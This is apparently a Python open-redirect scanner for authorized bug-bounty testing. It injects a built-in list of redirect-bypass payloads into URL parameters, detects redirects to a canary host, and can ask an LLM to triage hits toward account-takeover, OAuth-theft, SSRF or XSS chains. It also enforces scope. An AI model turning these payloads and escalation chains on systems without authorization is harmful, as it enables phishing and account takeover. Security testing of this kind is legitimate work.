#!/usr/bin/env python3
"""
open_redirect.py: open-redirect hunter, built on the crlf-hunter core.

Reuses crlf_hunt's recon, scope (allow/deny), and discovery, then tests each
parameter for an open redirect to a CANARY host you control (or example.com by
default). A hit = the server sends a 30x Location, or a meta/JS redirect, whose
HOST is the canary — i.e. attacker-controlled redirect target.

ONLY run against authorized targets. Scope is enforced via --scope exactly like
crlf_hunt. Detection only; it never weaponizes a redirect.

Usage:
  python3 open_redirect.py -d "*.target.com" --scope scope.txt --canary your-canary.com \
      --llm --llm-provider claude-code
  python3 open_redirect.py -u https://app.target.com/go?next=x --scope scope.txt
"""
import argparse
import json
import os
import re
import subprocess
import sys
import threading
import time
import types
import uuid
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from urllib.parse import urlparse, parse_qsl

import requests

import crlf_hunt as core  # shared recon, scope, helpers

UA = "Mozilla/5.0 (open-redirect-hunt; authorized testing)"

# Redirect-like params get the full payload set first.
REDIRECT_PARAMS = {
    "redirect", "redirect_uri", "redirect_url", "redirecturl", "url", "uri",
    "next", "return", "returnurl", "return_url", "returnto", "return_to",
    "continue", "goto", "go", "dest", "destination", "to", "out", "view",
    "image_url", "callback", "redir", "r", "u", "link", "target", "checkout_url",
    "ref", "referrer", "forward", "forward_url", "from", "path", "success",
    "success_url", "cancel_url", "back", "backurl", "login_url", "logout",
}

# {C} = canary host, {H} = target host. Injected raw as the param value.
PAYLOADS = [
    "https://{C}", "//{C}", "//{C}/", "/\\{C}", "/\\/{C}", "https:/{C}",
    "http://{C}", "///{C}", "////{C}", "\\\\{C}", "https://{C}/",
    "https://{H}@{C}", "https://{H}.{C}", "https://{C}?{H}", "https://{C}#{H}",
    "https://{C}/{H}", "/%2f{C}", "/%5c{C}", "%2f%2f{C}", "https://{C}%2f%2e%2e",
    "/{C}/%2e%2e", "/.{C}", "//{C}%2f%2e%2e", "https://{C}\\@{H}",
    "https:/\\{C}", "/\t/{C}", "/%09/{C}", "https://{C}%00.{H}",
]


def log(m):
    print(m, flush=True)


def inject(url, name, payload):
    pat = re.compile(r"([?&]" + re.escape(name) + r"=)[^&#]*")
    return pat.sub(lambda m: m.group(1) + payload, url, count=1)


def redirect_host(resp, canary):
    """Return (where, raw) if the response redirects to the canary host, else None.
    Normalizes backslashes (browsers treat \\ as /) before parsing the host."""
    canary = canary.lower()

    def host_of(s):
        return (urlparse(s.strip().replace("\\", "/")).hostname or "").lower()

    loc = resp.headers.get("Location", "")
    if loc:
        h = host_of(loc)
        if h == canary or h.endswith("." + canary):
            return ("Location header", loc)

    body = resp.text[:40000] if resp.text else ""
    # meta refresh
    for m in re.finditer(r'http-equiv=["\']?refresh["\']?[^>]*url=([^"\'>\s]+)', body, re.I):
        if host_of(m.group(1)) in (canary,) or host_of(m.group(1)).endswith("." + canary):
            return ("meta refresh", m.group(1))
    # JS redirect
    for m in re.finditer(
            r'(?:location\.(?:href|replace|assign)\s*\(?\s*|window\.location\s*=\s*|top\.location\s*=\s*)["\']([^"\']+)',
            body, re.I):
        if host_of(m.group(1)) == canary or host_of(m.group(1)).endswith("." + canary):
            return ("JS redirect", m.group(1))
    return None


def probe(session, url, canary, delay):
    time.sleep(delay)
    try:
        r = session.get(url, allow_redirects=False, timeout=10)
    except requests.RequestException:
        return None
    return redirect_host(r, canary)


def load_payloads(path):
    """Load templated payloads from a file, else fall back to the built-in set."""
    for p in (Path(path), Path("..") / path, Path("../payloads/open_redirect.txt")):
        if p.exists():
            return [l.strip() for l in p.read_text().splitlines()
                    if l.strip() and not l.startswith("#")]
    return PAYLOADS


def payloads_for(pool, name, canary, host):
    full = name.lower() in REDIRECT_PARAMS or core.looks_like_fetcher(name)
    use = pool if full else pool[:6]  # non-redirect params get a quick check
    return [p.replace("{C}", canary).replace("{H}", host) for p in use]


def _save_partial(findings):
    try:
        Path("findings_openredirect.json").write_text(json.dumps(findings, indent=2))
    except OSError:
        pass


def hunt(args, cands, canary, pool):
    """Concurrent across hosts, sequential (rate-limited) within each host.

    Different hosts are probed in parallel (--workers), but every URL on one
    host is handled by a single thread that sleeps --delay between requests, so
    no individual server is hammered. This is the same per-host-politeness model
    the CRLF fuzzer uses; the old version was fully sequential and crawled.
    """
    workers = getattr(args, "workers", 15)
    max_tests = getattr(args, "max_tests", 4000)

    # group candidate URLs by hostname -> one thread owns each host's rate limit
    by_host = {}
    for url in cands:
        by_host.setdefault(urlparse(url).hostname or "", []).append(url)

    findings = []
    lock = threading.Lock()
    state = {"tests": 0, "stop": False}

    def do_host(urls):
        s = requests.Session()
        s.headers["User-Agent"] = UA
        host = urlparse(urls[0]).hostname or ""
        for url in urls:
            names = {n for n, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)}
            for name in names:
                for payload in payloads_for(pool, name, canary, host):
                    with lock:
                        if state["stop"] or state["tests"] >= max_tests:
                            state["stop"] = True
                            return
                        state["tests"] += 1
                    tu = inject(url, name, payload)
                    hit = probe(s, tu, canary, args.delay)
                    if not hit:
                        continue
                    hit2 = probe(s, tu, canary, args.delay)  # confirm once more
                    where, raw = hit
                    with lock:
                        findings.append({
                            "url": tu, "param": name, "payload": payload,
                            "where": where, "evidence": raw,
                            "confirmed": hit2 is not None,
                        })
                        _save_partial(findings)
                    log(f"[HIT] {'confirmed' if hit2 else 'single'}  {name} @ {host}  ({where})")
                    break  # one working payload per param is enough

    try:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            list(ex.map(do_host, by_host.values()))
    except KeyboardInterrupt:
        state["stop"] = True
        log("[!] interrupted — partial findings saved to findings_openredirect.json")
    log(f"[*] {state['tests']} requests across {len(by_host)} hosts, {len(findings)} findings")
    return findings


# ---------------------------------------------------------------- LLM triage
def llm_call(prompt, provider, model, base_url):
    try:
        if provider == "claude-code":
            try:
                p = subprocess.run(["claude", "-p", prompt], capture_output=True,
                                   text=True, timeout=180)
                return p.stdout or ""
            except (FileNotFoundError, subprocess.TimeoutExpired):
                return ""
        if provider == "anthropic":
            key = os.environ.get("ANTHROPIC_API_KEY")
            if not key:
                return ""
            r = requests.post("https://api.anthropic.com/v1/messages",
                headers={"x-api-key": key, "anthropic-version": "2023-06-01",
                         "content-type": "application/json"},
                json={"model": model, "max_tokens": 1200,
                      "messages": [{"role": "user", "content": prompt}]}, timeout=120)
            return r.json()["content"][0]["text"]
        base = base_url or ("http://localhost:11434/v1" if provider == "ollama"
                            else "https://api.openai.com/v1")
        key = os.environ.get("LLM_API_KEY", "ollama")
        r = requests.post(base.rstrip("/") + "/chat/completions",
            headers={"Authorization": f"Bearer {key}", "content-type": "application/json"},
            json={"model": model, "messages": [{"role": "user", "content": prompt}]},
            timeout=120)
        return r.json()["choices"][0]["message"]["content"]
    except (requests.RequestException, KeyError, ValueError, IndexError):
        return ""


def triage(f, args, canary):
    prompt = f"""You are triaging a suspected OPEN REDIRECT from an AUTHORIZED bug-bounty test.

URL: {f['url']}
Parameter: {f['param']}
Payload: {f['payload']}
Redirect sink: {f['where']}
Redirect target observed: {f['evidence']}  (canary host = {canary})
Confirmed by re-test: {f['confirmed']}

A real open redirect sends the user to an attacker-controlled host ({canary} here) via Location, meta refresh, or JS. Be skeptical of self-referential or same-host redirects.

Walk the escalation decision tree and pick the highest REALISTIC branch:
- token/code carried in the redirect (Referer/POST) -> capture -> ATO (critical)
- redirect_uri in an OAuth/SSO flow -> auth-code theft -> ATO (critical)
- server itself follows the URL (image/webhook/PDF fetch) -> SSRF (high/critical)
- javascript:/data: accepted or destination reflected in page -> XSS (medium/high) [note it; the XSS module confirms]
- none of the above -> phishing via trusted domain (low/medium)

Return ONLY JSON:
{{"real": true/false, "severity":"info|low|medium|high|critical", "confidence":0-100,
"best_chain":"the chosen branch, concretely for THIS endpoint",
"next_tests":["ordered manual checks to prove that branch, in scope"],
"impact":"one sentence, only what evidence + a realistic chain supports",
"report_md":"Use exactly this structure: Title: Open Redirect on <endpoint> leading to <ATO/SSRF/XSS/Phishing>\\nSeverity: <level>\\nEndpoint: <url>\\nSteps to Reproduce: numbered, include the curl and the observed Location/meta/JS\\nImpact: what it enables\\nPoC URL: <the payload url>\\nEvidence: (note: screenshot/recording of the redirect in a browser). Claim no impact not demonstrated; mark chains as candidate until proven."}}"""
    text = llm_call(prompt, args.llm_provider, args.model, args.llm_base_url)
    m = re.search(r"\{.*\}", text, re.S)
    if m:
        try:
            return json.loads(m.group(0))
        except ValueError:
            pass
    return {}


def write_report(findings, triage_map, target, canary):
    out = [f"# Open Redirect Findings - {target}", "",
           "> DRAFT. Reproduce each PoC by hand (follow the redirect in a browser) "
           "before reporting. A same-host or self-referential redirect is not a bug.", ""]
    for i, f in enumerate(findings, 1):
        t = triage_map.get(i - 1, {})
        host = urlparse(f["url"]).hostname or f["url"]
        out += [f"## {i}. {f['param']} @ {host}",
                f"- confirmed: {f['confirmed']} · sink: {f['where']}",
                f"- LLM real/severity/confidence: {t.get('real','-')} / "
                f"{t.get('severity','-')} / {t.get('confidence','-')}",
                f"- best chain: {t.get('best_chain','-')}",
                f"- impact: {t.get('impact','-')}", "",
                "PoC:", "```bash", f"curl -sS -i '{f['url']}'", "```",
                f"Redirects to (`{f['where']}`): `{f['evidence']}`", ""]
        if t.get("next_tests"):
            out += ["Next tests: " + "; ".join(t["next_tests"]), ""]
        if t.get("report_md"):
            out += ["LLM report draft (edit before use):", "", t["report_md"], ""]
        out.append("---\n")
    Path("report_openredirect.md").write_text("\n".join(out))


def recon_args(args):
    """Build the namespace crlf_hunt.recon expects from our own args."""
    return types.SimpleNamespace(
        url=args.url, domain=args.domain, oob_url=None,
        no_crawl=args.no_crawl, crawl_all=args.crawl_all,
        crawl_cap=args.crawl_cap, wayback_cap=args.wayback_cap)


def main():
    ap = argparse.ArgumentParser(description="Open-redirect hunter (crlf-hunter core)")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-d", "--domain")
    g.add_argument("-u", "--url")
    ap.add_argument("--scope", required=True)
    ap.add_argument("--canary", default="example.com",
                    help="attacker host to detect redirects to (use one you control for a clean PoC)")
    ap.add_argument("--payloads", default="payloads/open_redirect.txt",
                    help="payload template file ({C}=canary, {H}=target host)")
    ap.add_argument("--delay", type=float, default=1.0)
    ap.add_argument("--max-tests", type=int, default=4000)
    ap.add_argument("--no-crawl", action="store_true")
    ap.add_argument("--crawl-all", dest="crawl_all", action="store_true")
    ap.add_argument("--crawl-cap", dest="crawl_cap", type=int, default=60)
    ap.add_argument("--wayback-cap", dest="wayback_cap", type=int, default=400)
    ap.add_argument("--llm", action="store_true")
    ap.add_argument("--llm-provider", default="claude-code",
                    choices=["claude-code", "anthropic", "openai", "ollama"])
    ap.add_argument("--llm-base-url")
    ap.add_argument("--model", default="llama3.1")
    args = ap.parse_args()

    scope = core.load_lines(args.scope)
    target = (args.domain or urlparse(args.url if args.url.startswith("http")
              else "https://" + args.url).hostname).lstrip("*.")
    if not core.in_scope(target, scope):
        sys.exit(f"[!] {target} is not in scope.txt. Stopping.")

    workdir = Path(f"openredirect_{target}")
    workdir.mkdir(exist_ok=True)
    os.chdir(workdir)
    log(f"[*] output: {workdir.resolve()}  ·  canary: {args.canary}")

    cands = core.recon(recon_args(args), scope)
    if not cands:
        sys.exit("[!] no parameterized URLs found")

    pool = load_payloads(args.payloads)
    log(f"[*] {len(pool)} payload templates")
    findings = hunt(args, cands, args.canary, pool)
    Path("findings.json").write_text(json.dumps(findings, indent=2))
    log(f"[*] {len(findings)} findings")

    triage_map = {}
    if args.llm and findings:
        for i, f in enumerate(findings):
            log(f"[*] triage {i+1}/{len(findings)}")
            triage_map[i] = triage(f, args, args.canary)
        Path("triage.json").write_text(json.dumps(triage_map, indent=2))

    write_report(findings, triage_map, target, args.canary)
    log(f"\nDone. See {workdir.resolve()}/report_openredirect.md")


if __name__ == "__main__":
    main()
